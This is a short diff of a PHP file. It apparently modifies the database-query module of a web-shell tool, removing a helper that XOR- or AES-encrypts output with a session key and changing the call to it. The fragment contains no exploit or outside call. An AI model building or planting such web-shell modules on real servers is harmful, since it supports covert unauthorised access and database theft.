@@ -159,21 +159,6 @@ function main($type, $host, $port, $user, $pass, $database, $sql)
     
     $resultObj["status"] = base64_encode($resultObj["status"]);
     $resultObj["msg"] = base64_encode($resultObj["msg"]);
-    echo encrypt(json_encode($resultObj),$_SESSION['k']);
-}
-
-function encrypt($data,$key)
-{
-	if(!extension_loaded('openssl'))
-    	{
-    		for($i=0;$i<strlen($data);$i++) {
-    			 $data[$i] = $data[$i]^$key[$i+1&15]; 
-    			}
-			return $data;
-    	}
-    else
-    	{
-    		return openssl_encrypt($data, "AES128", $key);
-    	}
+    echo encrypt(json_encode($resultObj));
 }
 
